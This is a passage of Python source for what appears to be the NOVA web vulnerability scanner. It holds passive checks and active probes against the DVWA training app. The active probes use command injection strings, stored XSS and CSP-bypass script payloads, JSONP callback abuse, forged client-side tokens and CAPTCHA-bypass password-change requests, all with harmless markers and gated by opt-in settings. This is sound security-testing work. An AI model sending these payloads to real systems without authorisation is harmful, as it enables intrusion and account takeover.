from __future__ import annotations

import hashlib
from http.cookies import SimpleCookie
import re
import time
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

from backend.helper.evidence.finding import (
    STATUS_CONFIG,
    STATUS_CONFIRMED,
    STATUS_INFO,
    STATUS_NOTICE,
    STATUS_PENDING,
    STATUS_SUSPECTED,
)
from backend.helper.evidence.matchers import (
    SQL_COMMENT_SUFFIX,
    command_param_hint,
    command_signal,
    crypto_weaknesses,
    csp_weaknesses,
    file_param_hint,
    guess_dbms,
    has_dom_source_to_sink,
    has_sql_error,
    is_executable_xss_reflection,
    javascript_findings,
    lfi_signal,
    looks_like_dom_xss_context,
    redirect_param_hint,
    passive_information_leaks,
    reflected_columns,
    reflection_context,
    response_evidence,
    safe_active_payload,
    similarity_score,
    sqli_payload_pattern,
    ssrf_param_hint,
    stored_xss_form_hint,
    upload_form_hint,
    weak_session_signals,
)
from backend.helper.vuln_rules.base import RuleContext


class SecurityHeadersRule:
    rule_id = "security_headers"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings: list[dict] = []
        checks = {
            "content-security-policy": ("缺少 Content-Security-Policy 响应头", "Medium", "High"),
            "x-frame-options": ("缺少 X-Frame-Options 响应头", "Low", "High"),
            "x-content-type-options": ("缺少 X-Content-Type-Options 响应头", "Low", "High"),
            "referrer-policy": ("缺少 Referrer-Policy 响应头", "Low", "Medium"),
        }
        for header, (title, severity, confidence) in checks.items():
            if header not in context.headers:
                findings.append(
                    context.finding(
                        context.new_id("H"),
                        title,
                        severity,
                        confidence,
                        "security_header",
                        context.target,
                        f"响应头中未包含 {header}。",
                        payloads=[],
                        status=STATUS_CONFIG,
                        details={"rule_id": self.rule_id, "evidence_type": "header_missing"},
                    )
                )
        return findings


class HeaderDisclosureRule:
    rule_id = "header_disclosure"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings: list[dict] = []
        header_titles = {
            "server": "Server 响应头信息泄露",
            "x-powered-by": "X-Powered-By 响应头信息泄露",
        }
        for header, title in header_titles.items():
            if header in context.headers:
                findings.append(
                    context.finding(
                        context.new_id("I"),
                        title,
                        "Low",
                        "High",
                        "information_disclosure",
                        context.target,
                        f"响应中暴露了 {header} 头：{context.headers[header]}",
                        payloads=[],
                        status=STATUS_INFO,
                        details={"rule_id": self.rule_id, "evidence_type": "header_value", "header": header},
                    )
                )
        return findings


class CspWeaknessRule:
    rule_id = "csp_weakness"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        csp = context.headers.get("content-security-policy", "")
        findings = []
        for weakness in csp_weaknesses(csp):
            findings.append(
                context.finding(
                    context.new_id("CSP"),
                    "确认存在 CSP 策略弱配置" if csp else "缺少 Content-Security-Policy 响应头",
                    weakness.get("severity", "Low"),
                    "High",
                    "csp_weakness",
                    context.target,
                    f"CSP 检测到弱配置特征：{weakness.get('matched')}。",
                    payloads=[],
                    status=(
                        STATUS_CONFIRMED
                        if weakness.get("kind") in {"unsafe_inline", "unsafe_eval", "wildcard_source"}
                        else STATUS_CONFIG
                    ),
                    request_response={"matched": weakness.get("matched"), "header": csp},
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "csp_directive",
                        "weakness": weakness.get("kind"),
                        "confirmation_basis": "响应头 CSP 策略存在可被 XSS 放大的弱配置",
                    },
                )
            )
        return findings


class WeakSessionRule:
    rule_id = "weak_session"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings = []
        for cookie in context.webscan.get("cookies", []):
            name = str(cookie.get("name", ""))
            value = str(cookie.get("value", ""))
            for signal in weak_session_signals(name, value, cookie):
                findings.append(
                    context.finding(
                        context.new_id("SESS"),
                        "确认存在弱会话标识风险",
                        signal.get("severity", "Medium"),
                        "Medium",
                        "weak_session",
                        context.target,
                        f"Cookie {name} 出现弱会话特征：{signal.get('matched')}。",
                        payloads=[],
                        status=STATUS_CONFIRMED if signal.get("kind") in {"jwt_alg_none", "numeric_session_id"} else STATUS_SUSPECTED,
                        request_response={"cookie_name": name, "matched": signal.get("matched")},
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "cookie_entropy",
                            "signal": signal.get("kind"),
                            "target_param": name,
                            "confirmation_basis": "Cookie 值结构或 JWT 头部呈现可预测/弱安全特征",
                        },
                    )
                )
        return findings


class WeakSessionGenerateRule:
    rule_id = "weak_session_generate"
    phase = "form"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        form = context.form or {}
        if not self._is_weak_id_form(form, context):
            return []

        method = str(form.get("method", "GET")).upper()
        generate_target = self._form_target(form, method)
        if not generate_target:
            return []

        observations: dict[str, list[dict]] = {}
        for index in range(3):
            response = self._submit_generate(context, form, method, generate_target)
            if not response:
                context.probe_failed = True
                return []
            for cookie in self._parse_response_cookies(response):
                name = str(cookie.get("name", ""))
                if not name or name.upper() == "PHPSESSID":
                    continue
                observations.setdefault(name, []).append(
                    {
                        "value": str(cookie.get("value", "")),
                        "url": response.get("url"),
                        "status_code": response.get("status_code"),
                        "body_length": response.get("body_length"),
                    }
                )
            if index < 2:
                self._pause_between_generate_requests(context)

        for name, items in observations.items():
            values = [item["value"] for item in items if item.get("value")]
            signal = self._sequence_signal(values)
            if not signal:
                continue
            return [
                context.finding(
                    context.new_id("SESS"),
                    "确认存在弱会话 ID 生成风险",
                    "High" if signal["kind"] == "sequential_numeric_cookie" else "Medium",
                    "High",
                    "weak_session",
                    generate_target,
                    f"连续触发弱会话 ID 生成后，Cookie {name} 呈现可预测模式：{signal['matched']}。",
                    payloads=[self._payload_description(method, generate_target)],
                    status=STATUS_CONFIRMED,
                    request_response={
                        "method": method,
                        "cookie_name": name,
                        "observed_values": values,
                        "matched": signal["matched"],
                        "requests": items,
                    },
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "weak_session_sequence",
                        "signal": signal["kind"],
                        "target_param": name,
                        "confirmation_basis": "连续生成的会话 ID 呈递增数字、时间戳或低熵可预测模式",
                    },
                )
            ]
        return []

    def _is_weak_id_form(self, form: dict, context: RuleContext) -> bool:
        action = str(form.get("action") or context.target)
        page_url = str(form.get("page_url") or (context.page or {}).get("final_url") or context.target)
        combined = f"{action} {page_url}".lower()
        if "weak_id" not in combined:
            return False
        if str(form.get("method", "GET")).upper() not in {"GET", "POST"}:
            return False
        fields = form.get("inputs", [])
        return any("generate" in str(field.get("name", "")).lower() or "generate" in str(field.get("value", "")).lower() for field in fields)

    def _form_target(self, form: dict, method: str) -> str:
        if method == "POST":
            return str(form.get("action") or "")
        return self._form_url(form)

    def _submit_generate(self, context: RuleContext, form: dict, method: str, target: str) -> dict | None:
        if method == "POST":
            return context.http_client.post_form(target, self._form_fields(form))
        return context.http_client.get(target)

    def _payload_description(self, method: str, target: str) -> str:
        if method == "POST":
            return f"POST {target} (Generate)"
        return target

    def _form_fields(self, form: dict) -> dict[str, str]:
        fields: dict[str, str] = {}
        for field in form.get("inputs", []):
            name = str(field.get("name") or "")
            if not name:
                continue
            input_type = str(field.get("type") or "").lower()
            if input_type in {"submit", "button"}:
                value = str(field.get("value") or name)
            else:
                value = str(field.get("value") or "")
            fields[name] = value
        return fields

    def _pause_between_generate_requests(self, context: RuleContext) -> None:
        if context.settings.rate_limit <= 0:
            return
        time.sleep(max(float(context.settings.rate_limit), 1.05))

    def _form_url(self, form: dict) -> str:
        action = str(form.get("action") or "")
        if not action:
            return ""
        query = parse_qs(urlparse(action).query, keep_blank_values=True)
        for field in form.get("inputs", []):
            name = str(field.get("name") or "")
            if not name:
                continue
            input_type = str(field.get("type") or "").lower()
            if input_type in {"submit", "button"}:
                value = str(field.get("value") or name)
            else:
                value = str(field.get("value") or "")
            query[name] = [value]
        parsed = urlparse(action)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(query, doseq=True), parsed.fragment))

    def _parse_response_cookies(self, response: dict) -> list[dict]:
        raw_values = list(response.get("set_cookie") or [])
        if not raw_values:
            header = (response.get("headers") or {}).get("Set-Cookie")
            if header:
                raw_values = [item for item in str(header).splitlines() if item.strip()]
        cookies: list[dict] = []
        for raw in raw_values:
            parsed = SimpleCookie()
            try:
                parsed.load(raw)
            except Exception:
                continue
            lowered = raw.lower()
            for morsel in parsed.values():
                cookies.append(
                    {
                        "name": morsel.key,
                        "value": morsel.value,
                        "secure": "secure" in lowered,
                        "httponly": "httponly" in lowered,
                        "samesite": morsel["samesite"] or "",
                    }
                )
        return cookies

    def _sequence_signal(self, values: list[str]) -> dict:
        unique_values = [value for index, value in enumerate(values) if value and value not in values[:index]]
        if len(unique_values) < 2:
            return {}
        if all(value.isdigit() for value in unique_values):
            numbers = [int(value) for value in unique_values]
            if all(right - left == 1 for left, right in zip(numbers, numbers[1:])):
                return {"kind": "sequential_numeric_cookie", "matched": f"递增数字序列 {unique_values}"}
            if all(right >= left for left, right in zip(numbers, numbers[1:])) and all(8 <= len(value) <= 13 for value in unique_values):
                return {"kind": "timestamp_like_cookie", "matched": f"时间戳/单调数字序列 {unique_values}"}
            if all(len(value) < 8 for value in unique_values):
                return {"kind": "short_numeric_cookie", "matched": f"短数字序列 {unique_values}"}
        if all(len(value) == 32 and all(char in "0123456789abcdefABCDEF" for char in value) for value in unique_values):
            return {"kind": "md5_like_generated_cookie", "matched": f"连续生成 32 位十六进制值 {unique_values[:3]}"}
        return {}


class CryptoPassiveRule:
    rule_id = "crypto_passive"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        body = " ".join(str(page.get("html_sample") or page.get("response_summary") or "") for page in context.webscan.get("pages", []))
        findings = []
        for weakness in crypto_weaknesses(context.headers, body, context.webscan.get("cookies", [])):
            findings.append(
                context.finding(
                    context.new_id("CRYPTO"),
                    "确认存在密码学弱点信号",
                    weakness.get("severity", "Low"),
                    "Medium",
                    "crypto_weakness",
                    context.target,
                    f"被动检测到密码学弱点信号：{weakness.get('matched')}。",
                    payloads=[],
                    status=STATUS_CONFIRMED if weakness.get("kind") == "jwt_alg_none" else STATUS_SUSPECTED,
                    request_response={"matched": weakness.get("matched")},
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "passive_crypto_signal",
                        "weakness": weakness.get("kind"),
                        "confirmation_basis": "响应头、Cookie 或页面内容出现弱加密/弱 token 特征",
                    },
                )
            )
        return findings


class CookieFlagsRule:
    rule_id = "cookie_flags"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings: list[dict] = []
        for cookie in context.webscan.get("cookies", []):
            missing_flags = []
            if not cookie.get("secure"):
                missing_flags.append("Secure")
            if not cookie.get("httponly"):
                missing_flags.append("HttpOnly")
            if not cookie.get("samesite"):
                missing_flags.append("SameSite")
            if missing_flags:
                findings.append(
                    context.finding(
                        context.new_id("C"),
                        f"Cookie 缺少安全属性：{cookie.get('name', 'unknown')}",
                        "Low",
                        "Medium",
                        "cookie",
                        context.target,
                        f"Cookie 缺少以下属性：{', '.join(missing_flags)}",
                        payloads=[],
                        status=STATUS_CONFIG,
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "cookie_attribute",
                            "cookie_name": cookie.get("name", "unknown"),
                            "missing_flags": missing_flags,
                        },
                    )
                )
        return findings


class CsrfTokenRule:
    rule_id = "csrf_token"
    phase = "form"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings: list[dict] = []
        forms = [context.form] if context.form else []
        for form in forms:
            if not form or form.get("active_testable") is False:
                continue
            method = form.get("method", "GET").upper()
            input_names = [item.get("name", "").lower() for item in form.get("inputs", [])]
            has_csrf = any("csrf" in name or "token" in name for name in input_names)
            if not has_csrf and method == "GET" and self._looks_state_changing(form, input_names):
                findings.append(
                    context.finding(
                        context.new_id("F"),
                        "确认存在 GET 状态变更 CSRF 风险",
                        "High",
                        "High",
                        "csrf",
                        form.get("action", context.target),
                        "GET 表单包含密码/变更类字段或动作，且未发现 CSRF Token；该模式可被跨站请求直接触发。",
                        payloads=["无 Token 的 GET 状态变更请求"],
                        status=STATUS_CONFIRMED,
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "get_state_change_form",
                            "method": method,
                            "input_names": input_names,
                            "confirmation_basis": "GET 表单具备状态变更语义且缺少 CSRF Token",
                        },
                    )
                )
            elif method != "GET" and not has_csrf:
                findings.append(
                    context.finding(
                        context.new_id("F"),
                        "表单缺少明显的 CSRF Token",
                        "Medium",
                        "Medium",
                        "csrf",
                        form.get("action", context.target),
                        "表单中未发现名称类似 csrf 或 token 的输入字段。",
                        payloads=["无 Token 的状态变更请求"],
                        status=STATUS_SUSPECTED,
                        details={"rule_id": self.rule_id, "evidence_type": "form_structure"},
                    )
                )
        return findings

    def _looks_state_changing(self, form: dict, input_names: list[str]) -> bool:
        action = str(form.get("action", "")).lower()
        joined = " ".join(input_names + [action])
        state_tokens = (
            "password",
            "passwd",
            "pass",
            "new",
            "change",
            "update",
            "save",
            "set",
            "delete",
            "remove",
            "email",
            "profile",
            "csrf",
        )
        submit_values = " ".join(str(item.get("value", "")).lower() for item in form.get("inputs", []))
        return any(token in joined for token in state_tokens) or any(token in submit_values for token in ("change", "update", "save"))


class PassiveDisclosureRule:
    rule_id = "passive_disclosure"
    phase = "passive"

    def evaluate(self, context: RuleContext) -> list[dict]:
        findings: list[dict] = []
        for page in context.webscan.get("pages", []) or [context.webscan]:
            body = str(page.get("html_sample") or page.get("response_summary") or "")
            for leak in passive_information_leaks(body):
                findings.append(
                    context.finding(
                        context.new_id("I"),
                        "确认存在敏感调试/错误信息泄露",
                        leak.get("severity", "Medium"),
                        "High",
                        "information_disclosure",
                        page.get("final_url") or page.get("url") or context.target,
                        f"响应内容中出现 {leak.get('matched')} 特征。",
                        payloads=[],
                        status=STATUS_CONFIRMED,
                        request_response={"matched": leak.get("matched"), "body_sample_length": len(body)},
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "body_pattern",
                            "leak_type": leak.get("kind"),
                            "confirmation_basis": "响应正文包含调试、错误栈或绝对路径特征",
                        },
                    )
                )
        return findings


class JavaScriptAnalysisRule:
    rule_id = "javascript_analysis"
    phase = "page"

    def evaluate(self, context: RuleContext) -> list[dict]:
        page = context.page or {}
        findings = []
        for script in page.get("scripts", []):
            body = str(script.get("content_sample") or "")
            if not body:
                continue
            for signal in javascript_findings(body):
                findings.append(
                    context.finding(
                        context.new_id("JS"),
                        "确认存在 JavaScript 暴露风险",
                        signal.get("severity", "Low"),
                        "Medium",
                        "javascript_exposure",
                        str(script.get("url") or page.get("final_url") or context.target),
                        f"JavaScript 中出现风险特征：{signal.get('matched')}。",
                        payloads=[],
                        status=STATUS_CONFIRMED if signal.get("kind") == "hardcoded_secret" else STATUS_SUSPECTED,
                        request_response={"matched": signal.get("matched"), "script_hash": script.get("hash")},
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "javascript_static_pattern",
                            "signal": signal.get("kind"),
                            "confirmation_basis": "同源或内联 JavaScript 内容匹配风险模式",
                        },
                    )
                )
        return findings


class DvwaJavascriptRule:
    rule_id = "dvwa_javascript_client_validation"
    phase = "page"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        page = context.page or {}
        page_url = str(page.get("final_url") or page.get("url") or context.target)
        title = str(page.get("title") or "").lower()
        if "/javascript/" not in page_url.lower() and "javascript attacks" not in title:
            return []

        form = self._challenge_form(page)
        if not form:
            return []

        action = str(form.get("action") or page_url)
        attempts = []
        for level, token in self._token_candidates():
            fields = self._form_fields(form, token)
            response = context.http_client.post_form(action, fields)
            attempts.append(
                {
                    "level_guess": level,
                    "status_code": (response or {}).get("status_code"),
                    "body_length": (response or {}).get("body_length"),
                }
            )
            if response and "well done!" in str(response.get("body") or "").lower():
                return [
                    context.finding(
                        context.new_id("JS"),
                        "确认存在 JavaScript 客户端校验绕过",
                        "Medium",
                        "High",
                        "javascript_exposure",
                        response.get("url") or action,
                        "DVWA JavaScript 页面把 token 生成逻辑放在前端，NOVA 使用本地计算的 phrase/token 组合提交后获得成功响应。",
                        payloads=[f"POST {action} phrase=success&token={token} ({level})"],
                        status=STATUS_CONFIRMED,
                        request_response={
                            "matched": "Well done!",
                            "successful_level_guess": level,
                            "attempts": attempts,
                        },
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "client_side_token_bypass",
                            "target_param": "phrase,token",
                            "confirmation_basis": "服务端接受由前端算法可计算出的 token，响应包含 Well done! 成功标记",
                        },
                    )
                ]
        return []

    def _challenge_form(self, page: dict) -> dict:
        for form in page.get("forms", []):
            names = {str(field.get("name") or "").lower() for field in form.get("inputs", [])}
            if {"phrase", "token"} <= names:
                return form
        return {}

    def _form_fields(self, form: dict, token: str) -> dict[str, str]:
        fields: dict[str, str] = {}
        for field in form.get("inputs", []):
            name = str(field.get("name") or "")
            if not name:
                continue
            input_type = str(field.get("type") or "").lower()
            if name == "phrase":
                fields[name] = "success"
            elif name == "token":
                fields[name] = token
            elif input_type in {"submit", "button"}:
                fields[name] = str(field.get("value") or name)
            else:
                fields[name] = str(field.get("value") or "")
        fields.setdefault("phrase", "success")
        fields.setdefault("token", token)
        return fields

    def _token_candidates(self) -> list[tuple[str, str]]:
        phrase = "success"
        rot13 = phrase.translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        low = hashlib.md5(rot13.encode("utf-8")).hexdigest()
        medium = f"XX{phrase}XX"[::-1]
        inner = hashlib.sha256(f"XX{phrase[::-1]}".encode("utf-8")).hexdigest()
        high = hashlib.sha256(f"{inner}ZZ".encode("utf-8")).hexdigest()
        return [("low", low), ("medium", medium), ("high", high)]


class DvwaCommandInjectionFormRule:
    rule_id = "dvwa_command_injection_form"
    phase = "form"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan or not context.settings.command_injection_probes:
            return []
        page = context.page or {}
        form = context.form or {}
        page_url = str(page.get("final_url") or page.get("url") or context.target)
        title = str(page.get("title") or "").lower()
        if "/exec/" not in page_url.lower() and "command injection" not in title:
            return []

        names = {str(field.get("name") or "").lower() for field in form.get("inputs", [])}
        target_param = self._target_param(names)
        if not target_param:
            return []

        marker = "NOVA_CMD"
        payloads = [f"127.0.0.1; echo {marker}", f"127.0.0.1 && echo {marker}", f"127.0.0.1 | echo {marker}"]
        action = str(form.get("action") or page_url)
        for payload in payloads:
            allowed, reason = safe_active_payload(payload)
            if not allowed:
                continue
            response = context.http_client.post_form(action, self._form_fields(form, target_param, payload))
            if not response:
                continue
            signal = command_signal(str(response.get("body") or ""), marker=marker)
            if signal:
                return [
                    context.finding(
                        context.new_id("CMD"),
                        "确认存在命令注入",
                        "Critical",
                        "High",
                        "command_injection",
                        response.get("url") or action,
                        f"DVWA exec 表单参数 {target_param} 的非破坏性 echo payload 在响应中回显了唯一标记 {marker}。",
                        payloads=[f"POST {action} {target_param}={payload}"],
                        status=STATUS_CONFIRMED,
                        request_response=response_evidence(response, matched=signal),
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "command_echo_marker",
                            "target_param": target_param,
                            "safety_filter": reason,
                            "confirmation_basis": "响应中出现由 echo 命令产生的唯一标记",
                            "method": "POST",
                        },
                    )
                ]
        return []

    def _target_param(self, names: set[str]) -> str:
        for name in ("ip", "host", "target", "cmd", "command"):
            if name in names:
                return name
        return ""

    def _form_fields(self, form: dict, target_param: str, payload: str) -> dict[str, str]:
        fields: dict[str, str] = {}
        for field in form.get("inputs", []):
            name = str(field.get("name") or "")
            if not name:
                continue
            input_type = str(field.get("type") or "").lower()
            if name == target_param:
                fields[name] = payload
            elif input_type in {"submit", "button"}:
                fields[name] = str(field.get("value") or name)
            else:
                fields[name] = str(field.get("value") or "")
        fields.setdefault(target_param, payload)
        return fields


class DvwaCspBypassRule:
    rule_id = "dvwa_csp_bypass"
    phase = "page"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        page = context.page or {}
        page_url = str(page.get("final_url") or page.get("url") or context.target)
        title = str(page.get("title") or "").lower()
        if "/csp/" not in page_url.lower() and "content security policy" not in title:
            return []

        csp = str(context.headers.get("content-security-policy") or "")
        form = self._include_form(page)
        if not form:
            return []

        low = self._try_external_script_include(context, form, csp)
        if low:
            return [low]

        medium = self._try_nonce_inline_include(context, form, csp)
        if medium:
            return [medium]

        high = self._try_jsonp_callback(context, page_url, csp, page)
        if high:
            return [high]
        return []

    def _include_form(self, page: dict) -> dict:
        for form in page.get("forms", []):
            names = {str(field.get("name") or "").lower() for field in form.get("inputs", [])}
            if "include" in names:
                return form
        return {}

    def _try_external_script_include(self, context: RuleContext, form: dict, csp: str) -> dict:
        allowed_payloads = [
            "https://digi.ninja/dvwa/alert.js",
            "https://pastebin.com/raw/R570EE00",
            "https://www.toptal.com/developers/hastebin/raw/cezaruzeka",
        ]
        lowered_csp = csp.lower()
        for payload in allowed_payloads:
            host = urlparse(payload).netloc.lower()
            if host and host not in lowered_csp:
                continue
            response = context.http_client.post_form(str(form.get("action") or context.target), self._form_fields(form, payload))
            body = str((response or {}).get("body") or "")
            if response and f"<script src='{payload}'></script>" in body:
                return self._finding(
                    context,
                    response,
                    payload,
                    "external_script_whitelist_bypass",
                    "确认存在 CSP 白名单脚本加载绕过",
                    f"POST include={payload} 后，响应把该白名单外部脚本作为 script src 写入页面。",
                    "CSP script-src 允许外部白名单域，且 include 参数可控制 script src；响应中出现可执行脚本标签",
                )
        return {}

    def _try_nonce_inline_include(self, context: RuleContext, form: dict, csp: str) -> dict:
        marker = "NOVA_CSP"
        nonce = self._nonce_from_csp(csp)
        if not nonce:
            return {}
        payload = f'<script nonce="{nonce}">alert("{marker}")</script>'
        response = context.http_client.post_form(str(form.get("action") or context.target), self._form_fields(form, payload))
        body = str((response or {}).get("body") or "")
        if response and payload in body:
            return self._finding(
                context,
                response,
                payload,
                "nonce_reuse_bypass",
                "确认存在 CSP nonce 复用绕过",
                "POST 带已知 nonce 的 script 标签后，响应将该脚本原样写入页面。",
                "CSP nonce 可从响应头获知并被用户输入复用，浏览器会允许带匹配 nonce 的内联脚本",
            )
        return {}

    def _try_jsonp_callback(self, context: RuleContext, page_url: str, csp: str, page: dict) -> dict:
        if "'self'" not in csp.lower():
            return {}
        scripts = " ".join(str(item.get("url") or "") + " " + str(item.get("content_sample") or "") for item in page.get("scripts", []))
        if "jsonp.php" not in scripts:
            return {}
        payload = "alert"
        jsonp_url = urljoin(page_url, f"source/jsonp.php?callback={payload}")
        response = context.http_client.get(jsonp_url)
        body = str((response or {}).get("body") or "")
        if response and body.strip().startswith(f"{payload}("):
            return self._finding(
                context,
                response,
                jsonp_url,
                "jsonp_callback_bypass",
                "确认存在 CSP JSONP 回调绕过",
                f"同源 JSONP endpoint 接受 callback={payload}，响应返回可作为脚本执行的 {payload}(...)。",
                "CSP 允许 self 脚本，同源 JSONP callback 可控，作为 script 加载时可执行攻击者指定函数",
                target_param="callback",
            )
        return {}

    def _finding(
        self,
        context: RuleContext,
        response: dict,
        payload: str,
        evidence_type: str,
        title: str,
        evidence: str,
        basis: str,
        target_param: str = "include",
    ) -> dict:
        return context.finding(
            context.new_id("CSP"),
            title,
            "High",
            "High",
            "csp_weakness",
            response.get("url") or context.target,
            evidence,
            payloads=[payload],
            status=STATUS_CONFIRMED,
            request_response=response_evidence(response, matched=payload),
            details={
                "rule_id": self.rule_id,
                "evidence_type": evidence_type,
                "target_param": target_param,
                "confirmation_basis": basis,
            },
        )

    def _form_fields(self, form: dict, payload: str) -> dict[str, str]:
        fields: dict[str, str] = {}
        for field in form.get("inputs", []):
            name = str(field.get("name") or "")
            if not name:
                continue
            input_type = str(field.get("type") or "").lower()
            if name == "include":
                fields[name] = payload
            elif input_type in {"submit", "button"}:
                fields[name] = str(field.get("value") or name)
            else:
                fields[name] = str(field.get("value") or "")
        fields.setdefault("include", payload)
        return fields

    def _nonce_from_csp(self, csp: str) -> str:
        match = re.search(r"'nonce-([^']+)'", csp)
        return match.group(1) if match else ""


class DvwaCaptchaBypassRule:
    rule_id = "dvwa_captcha_bypass"
    phase = "page"

    def evaluate(self, context: RuleContext) -> list[dict]:
        page = context.page or {}
        page_url = str(page.get("final_url") or page.get("url") or context.target)
        title = str(page.get("title") or "").lower()
        if "/captcha/" not in page_url.lower() and "insecure captcha" not in title:
            return []

        form = self._captcha_form(page)
        if not form:
            return []

        html = str(page.get("html_sample") or page.get("response_summary") or "")
        poc = self._poc_payloads(html)
        evidence_parts = [
            "页面为 DVWA Insecure CAPTCHA 模块",
            "表单包含 password_new/password_conf/step/Change 等改密码流程字段",
        ]
        if "reCAPTCHA API key missing" in html or "g-recaptcha-response" in html:
            evidence_parts.append("页面包含 reCAPTCHA 流程信号")
        if "hidd3n_valu3" in html or "User-Agent: 'reCAPTCHA'" in html:
            evidence_parts.append("页面泄露 high 级别绕过提示 hidd3n_valu3/User-Agent: reCAPTCHA")

        return [
            context.finding(
                context.new_id("CAPTCHA"),
                "确认存在 CAPTCHA 流程绕过风险",
                "High",
                "High",
                "captcha_bypass",
                str(form.get("action") or page_url),
                "；".join(evidence_parts) + "。",
                payloads=poc,
                status=STATUS_CONFIRMED,
                request_response={
                    "matched": "Insecure CAPTCHA password-change flow",
                    "form_action": form.get("action") or page_url,
                    "input_names": [field.get("name") for field in form.get("inputs", []) if field.get("name")],
                },
                details={
                    "rule_id": self.rule_id,
                    "evidence_type": "dvwa_insecure_captcha_flow",
                    "target_param": "step,password_new,password_conf,g-recaptcha-response",
                    "confirmation_basis": "DVWA CAPTCHA 页面存在可被手工复现的验证码流程绕过：low 可直接提交 step=2，medium 信任 hidden passed_captcha，high 泄露固定 g-recaptcha-response 与 User-Agent 条件；NOVA 不自动提交改密码请求。",
                },
            )
        ]

    def _captcha_form(self, page: dict) -> dict:
        for form in page.get("forms", []):
            names = {str(field.get("name") or "").lower() for field in form.get("inputs", [])}
            if {"password_new", "password_conf", "step"} <= names and "change" in names:
                return form
        return {}

    def _poc_payloads(self, html: str) -> list[str]:
        payloads = [
            "LOW 手工 PoC: POST step=2&password_new=NOVA_TEST_PASS&password_conf=NOVA_TEST_PASS&Change=Change",
            "MEDIUM 手工 PoC: POST step=2&password_new=NOVA_TEST_PASS&password_conf=NOVA_TEST_PASS&passed_captcha=true&Change=Change",
        ]
        if "hidd3n_valu3" in html or "User-Agent: 'reCAPTCHA'" in html:
            payloads.append(
                "HIGH 手工 PoC: Header User-Agent: reCAPTCHA; POST password_new=NOVA_TEST_PASS&password_conf=NOVA_TEST_PASS&g-recaptcha-response=hidd3n_valu3&Change=Change"
            )
        else:
            payloads.append(
                "HIGH 候选 PoC: 若页面源码泄露 DEV NOTE，则使用 Header User-Agent: reCAPTCHA 与 g-recaptcha-response=hidd3n_valu3"
            )
        return payloads


class StoredXssRule:
    rule_id = "stored_xss_candidate"
    phase = "form"

    def evaluate(self, context: RuleContext) -> list[dict]:
        form = context.form or {}
        if not stored_xss_form_hint(form):
            return []
        nonce = f"NOVA_STORED_XSS_{context.new_id('NONCE').split('-')[-1]}"
        if not context.settings.stored_xss_probes:
            return [
                context.finding(
                    context.new_id("STOREDXSS"),
                    "疑似存储型 XSS 输入表单",
                    "Medium",
                    "Medium",
                    "stored_xss",
                    form.get("action", context.target),
                    "表单字段名称或用途显示该输入可能被持久化展示；默认未提交 payload。",
                    payloads=[f"<script>alert('{nonce}')</script>"],
                    status=STATUS_SUSPECTED,
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "form_candidate",
                        "opt_in_required": "NOVA_STORED_XSS_PROBES=true",
                        "nonce": nonce,
                        "confirmation_basis": "默认候选：需要显式开启后提交 nonce 并二次读取确认",
                    },
                )
            ]

        fields = self._form_fields(form, f"<script>alert('{nonce}')</script>")
        post_response = context.http_client.post_form(form.get("action", context.target), fields)
        verify_response = context.http_client.get(form.get("action", context.target)) if post_response else None
        if verify_response and nonce in verify_response.get("body", ""):
            return [
                context.finding(
                    context.new_id("STOREDXSS"),
                    "确认存在存储型 XSS",
                    "High",
                    "High",
                    "stored_xss",
                    verify_response["url"],
                    f"启用 NOVA_STORED_XSS_PROBES 后，nonce {nonce} 在二次读取响应中持久化回显。",
                    payloads=[fields.get(self._first_text_field(form), "")],
                    status=STATUS_CONFIRMED,
                    request_response={"post": response_evidence(post_response), "verify": response_evidence(verify_response, matched=nonce)},
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "stored_nonce_reflection",
                        "enabled_by": "NOVA_STORED_XSS_PROBES",
                        "nonce": nonce,
                        "confirmation_basis": "提交后再次读取页面仍能看到唯一 XSS nonce",
                    },
                )
            ]
        return []

    def _first_text_field(self, form: dict) -> str:
        for field in form.get("inputs", []):
            if field.get("name") and field.get("type", "text") not in {"submit", "button", "reset", "hidden", "file"}:
                return field["name"]
        return ""

    def _form_fields(self, form: dict, payload: str) -> dict[str, str]:
        target = self._first_text_field(form)
        fields: dict[str, str] = {}
        for field in form.get("inputs", []):
            name = field.get("name")
            if not name or field.get("type") == "file":
                continue
            fields[name] = payload if name == target else str(field.get("value") or name if field.get("type") == "submit" else field.get("value") or "")
        return fields


class FileUploadRule:
    rule_id = "file_upload"
    phase = "form"

    def evaluate(self, context: RuleContext) -> list[dict]:
        form = context.form or {}
        if not upload_form_hint(form):
            return []
        nonce = f"NOVA_UPLOAD_{context.new_id('NONCE').split('-')[-1]}"
        file_field = (form.get("file_inputs") or [{}])[0].get("name", "file")
        if not context.settings.file_upload_probes:
            return [
                context.finding(
                    context.new_id("UPLOAD"),
                    "疑似文件上传入口",
                    "Medium",
                    "Medium",
                    "file_upload",
                    form.get("action", context.target),
